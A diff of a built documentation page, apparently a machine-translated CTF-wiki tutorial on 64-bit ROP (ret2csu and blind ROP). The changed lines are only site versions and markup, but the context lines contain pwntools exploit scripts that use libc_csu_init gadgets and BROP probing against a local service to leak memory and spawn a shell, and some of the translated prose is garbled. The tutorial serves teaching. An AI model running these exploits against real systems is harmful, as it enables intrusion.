@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4824,7 +4824,7 @@
 <p>.text:0000000000400622                 pop     r15</p>
 <p>.text: 0000000000400624 retn
 .text:0000000000400624 __libc_csu_init endp</p>
-<div class="codehilite"><pre><span></span>Here we can use the following points
+<div class="codehilite"><pre><span></span><code>Here we can use the following points
 
 
 - From 0x000000000040061A to the end, we can use the stack overflow to construct data on the stack to control the data in the rbx, rbp, r12, r13, r14, r15 registers.
@@ -4851,11 +4851,11 @@ Here we take the steamed rice step by step to learn the level5 of the linux linu
     NX:       NX enabled
 
     PIE:      No PIE (0x400000)
-</pre></div>
+</code></pre></div>
 
 <p>The program is 64-bit and the stack unenforceable protection is turned on.</p>
 <p>Second, looking for bugs in the program, you can see that there is a simple stack overflow in the program.</p>
-<div class="codehilite"><pre><span></span><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -4866,7 +4866,7 @@ Here we take the steamed rice step by step to learn the level5 of the linux linu
   <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>A simple browsing of the program, found that the program has neither the system function address nor the /bin/sh string, so both of us need to construct ourselves.</p>
 <p><strong>Note: Here I tried to use the system function to get the shell failed. It should be a problem with environment variables, so here is the execve to get the shell. </strong></p>
@@ -4878,7 +4878,7 @@ Here we take the steamed rice step by step to learn the level5 of the linux linu
 <li>Execute libc_csu_gadgets again with stack overflow to execute execve(&#39;/bin/sh&#39;) to get the shell.</li>
 </ul>
 <p>Exp is as follows</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
 
@@ -4987,7 +4987,7 @@ Here we take the steamed rice step by step to learn the level5 of the linux linu
 <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="thinking">Thinking<a class="headerlink" href="#thinking" title="Permanent link">&para;</a></h3>
 <h4 id="improve">Improve<a class="headerlink" href="#improve" title="Permanent link">&para;</a></h4>
@@ -5003,7 +5003,7 @@ Here we take the steamed rice step by step to learn the level5 of the linux linu
 <p><strong> Of course, sometimes we will encounter a large number of bytes that can be read in one time, but the vulnerability is not allowed to be reused. At this time, we need to arrange all the bytes at once and then use it slowly. </strong></p>
 <h4 id="gadget">gadget<a class="headerlink" href="#gadget" title="Permanent link">&para;</a></h4>
 <p>In fact, in addition to the above gadgets, gcc will compile some other functions by default.</p>
-<div class="codehilite"><pre><span></span>_init
+<div class="codehilite"><pre><span></span><code>_init
 
 _start
 
@@ -5020,7 +5020,7 @@ __libc_csu_init
 
 __libc_csu_fini
 _fini
-</pre></div>
+</code></pre></div>
 
 <p>We can also try to use some of the code to perform. In addition, since the PC itself simply passes the data at the execution address of the program to the CPU, the CPU simply decodes the transferred data, and as long as the decoding is successful, it is executed. So we can offset some of the addresses in the source program to get the instructions we want, as long as we can ensure that the program does not crash.</p>
 <p>Need to say that in the above libc_csu_init we mainly use the following registers</p>
@@ -5077,7 +5077,7 @@ gef➤  x/5i 0x000000000040061e</p>
    0x400625:    nop</p>
 <p>0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</p>
 <p>0x400630 &lt;__libc_csu_fini&gt;: repz ret
-<div class="codehilite"><pre><span></span>### Title
+<div class="codehilite"><pre><span></span><code>### Title
 
 
 - 2016 XDCTF pwn100
@@ -5163,9 +5163,9 @@ You can enumerate directly from 1 violence until you find the program crashes.
 
 
 As shown below, this is the current classic stack layout
-</pre></div></p>
+</code></pre></div></p>
 <p>buffer|canary|saved fame pointer|saved returned address</p>
-<div class="codehilite"><pre><span></span>To get the canary and the variables that follow, we need to solve the first problem, how to get the length of the overflow, which can be obtained by continuous trial.
+<div class="codehilite"><pre><span></span><code>To get the canary and the variables that follow, we need to solve the first problem, how to get the length of the overflow, which can be obtained by continuous trial.
 
 
 Secondly, regarding the canary and the following variables, the method used is the same. Here we take canary as an example.
@@ -5198,7 +5198,7 @@ pop rdx; ret # length
 pop rax; ret # write syscall number
 
 syscall
-</pre></div>
+</code></pre></div>
 
 <p>But in general, such an approach is more difficult, because it is basically impossible to find a syscall address. . . We can get it by converting to find the way to write.</p>
 <h6 id="brop-gadgets">BROP gadgets<a class="headerlink" href="#brop-gadgets" title="Permanent link">&para;</a></h6>
@@ -5210,7 +5210,7 @@ syscall
 <p>It should be noted that rdx is just a variable we use to output the length of the program byte, as long as it is not 0. Generally speaking, the rdx in the program will not be zero. But in order to better control the program output, we still try to control this value. But in the program</p>
 <p><code>`</code>asm
 pop rdx; ret</p>
-<div class="codehilite"><pre><span></span>There are almost no such instructions. So how do we control the value of rdx? Here we need to explain that when strcmp is executed, rdx will be set to the length of the string to be compared, so we can find the strcmp function to control rdx.
+<div class="codehilite"><pre><span></span><code>There are almost no such instructions. So how do we control the value of rdx? Here we need to explain that when strcmp is executed, rdx will be set to the length of the string to be compared, so we can find the strcmp function to control rdx.
 
 
 Then the next question, we can be divided into two
@@ -5395,10 +5395,10 @@ Of course, we can also choose to look for the puts function.
 
 
 Looking for the puts function (here we are looking for plt), we naturally need to control the rdi parameters. Above, we have found the brop gadget. Then, we can get the corresponding gadgets according to the brop gadget offset 9 (followed by ret2libc_csu_init). At the same time, in the case that the program has not yet turned on PIE protection, 0x400000 is the head of the ELF file, and its content is \x7fELF. So we can judge based on this. In general, its payload is as follows
-</pre></div>
+</code></pre></div>
 
 <p>payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</p>
-<div class="codehilite"><pre><span></span>#### Attack Summary
+<div class="codehilite"><pre><span></span><code>#### Attack Summary
 
 
 At this point, the attacker can already control the output function, so the attacker can output more content of the .text section in order to find more suitable gadgets. At the same time, the attacker can also find some other functions, such as dup2 or execve functions. Generally, the attacker will do the next thing at this time.
@@ -5450,12 +5450,12 @@ def getbufferflow_length():
             sh.close()
 
             return i - 1
-</pre></div>
+</code></pre></div>
 
 <p>Based on the above, we can determine that the length of the stack overflow is 72. At the same time, according to the echo information, it can be found that the program does not open canary protection, otherwise, there will be corresponding error content. So we don&#39;t need to perform stack reading.</p>
 <h4 id="looking-for-stop-gadgets">Looking for stop gadgets<a class="headerlink" href="#looking-for-stop-gadgets" title="Permanent link">&para;</a></h4>
 <p>The search process is as follows</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
 
     <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
 
@@ -5484,15 +5484,15 @@ def getbufferflow_length():
             <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
 
             <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>Here we directly try 64-bit programs without PIE, because it is generally like this, if it is turned on, then follow the open method, and found a lot, I chose a seemingly return Address to the source program</p>
-<div class="codehilite"><pre><span></span>one success stop gadget addr: 0x4006b6
-</pre></div>
+<div class="codehilite"><pre><span></span><code>one success stop gadget addr: 0x4006b6
+</code></pre></div>
 
 <h4 id="identifying-brop-gadgets">Identifying brop gadgets<a class="headerlink" href="#identifying-brop-gadgets" title="Permanent link">&para;</a></h4>
 <p>Below, we get the corresponding brop gadgets address according to the principle described above. Constructed as follows, get_brop_gadget is to get a possible brop gadget, the latter check_brop_gadget is for checking.</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
 
     <span class="k">try</span><span class="p">:</span>
 
@@ -5583,16 +5583,16 @@ def getbufferflow_length():
             <span class="k">break</span>
 
     <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
-</pre></div>
+</code></pre></div>
 
 <p>In this way, we basically got the bopp gadgets address 0x4007ba</p>
 <h4 id="determine-the-putsplt-address">Determine the puts@plt address<a class="headerlink" href="#determine-the-putsplt-address" title="Permanent link">&para;</a></h4>
 <p>According to the above, we can construct the following payload to get the acquisition.</p>
-<div class="codehilite"><pre><span></span>payload = &#39;A&#39;*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>payload = &#39;A&#39;*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
+</code></pre></div>
 
 <p>The specific function is as follows</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
 
     <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
 
@@ -5628,12 +5628,12 @@ def getbufferflow_length():
             <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
             <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
-</pre></div>
+</code></pre></div>
 
 <p>Finally, according to the structure of plt, choose 0x400560 as puts@plt</p>
 <h4 id="leaking-putsgot-address">Leaking puts@got address<a class="headerlink" href="#leaking-putsgot-address" title="Permanent link">&para;</a></h4>
 <p>After we can call the puts function, we can leak the address of the puts function, and then get the libc version, so as to get the relevant system function address and /bin/sh address to get the shell. We leaked 0x1000 bytes from 0x400000, which is enough to contain the plt part of the program. code show as below</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
 
     <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
 
@@ -5710,7 +5710,7 @@ def getbufferflow_length():
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 
     <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>Finally, we write the leaked content to a file. It should be noted that if the leak is &quot;&quot;, then we have encountered &#39;\x00&#39;, because puts is the output string, the string is terminated with &#39;\x00&#39;. Then use ida to open the binary mode, first change the base address of the program to 0x400000 in edit-&gt;segments-&gt;rebase program, and then find the offset 0x560, as follows</p>
 <p><code>`</code>asm
@@ -5720,7 +5720,7 @@ seg000: 0000000000400562 db 0B2h;
 seg000: 0000000000400563 db 0Ah
 seg000:0000000000400564                 db  20h</p>
 <p>seg000: 0000000000400565 db 0
-<div class="codehilite"><pre><span></span>Then press c to convert the data here into assembly instructions as follows
+<div class="codehilite"><pre><span></span><code>Then press c to convert the data here into assembly instructions as follows
 
 
 `` `asm
@@ -5732,10 +5732,10 @@ seg000:0000000000400566                 push    0
 seg000:000000000040056B                 jmp     loc_400550
 
 seg000:000000000040056B ; ---------------------------------------------------------------------------
-</pre></div></p>
+</code></pre></div></p>
 <p>This shows that the address of puts@got is 0x601018.</p>
 <h4 id="program-utilization">Program Utilization<a class="headerlink" href="#program-utilization" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="c1">##length = getbufferflow_length()</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##length = getbufferflow_length()</span>
 
 <span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
 
@@ -5783,7 +5783,7 @@ seg000:000000000040056B ; ------------------------------------------------------
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="reference-reading">Reference reading<a class="headerlink" href="#reference-reading" title="Permanent link">&para;</a></h3>
 <ul>
@@ -5862,7 +5862,7 @@ seg000:000000000040056B ; ------------------------------------------------------
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5877,7 +5877,7 @@ seg000:000000000040056B ; ------------------------------------------------------
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
